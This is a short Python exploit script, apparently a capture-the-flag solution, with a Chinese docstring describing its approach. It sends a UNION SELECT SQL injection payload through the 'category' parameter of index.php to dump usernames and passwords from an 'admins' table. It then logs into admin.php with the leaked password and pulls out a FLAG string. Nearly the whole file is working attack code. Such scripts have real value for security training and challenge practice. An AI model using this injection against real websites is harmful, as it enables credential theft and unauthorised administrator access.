import re
import requests
import sys

'''
@文件命名：X-078-24
@使用方式: python X-078-24.py url
@简述思路: 利用 SQL 注入泄露管理员密码，随后登录后台页面获取 flag。
'''


def Scan(url):
    s = requests.Session()
    payload = "%27%20UNION%20SELECT%201,%20username,%20%27Leaked%27,%20password,%20%27x.jpg%27,%201,%20now()%20FROM%20admins%20--%20-"
    r = s.get(f"{url}/index.php?category=" + payload)
    pass_match = re.findall(r"<p>.*</p>", r.text)
    password = pass_match[1].replace("<p>", "").replace("</p>", "").replace(".", "")
    r = s.post(f"{url}/admin.php", data=f"username=admin&password={password}", headers={"Content-Type": "application/x-www-form-urlencoded"})
    return re.search(r"FLAG\{.*?\}", r.text).group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
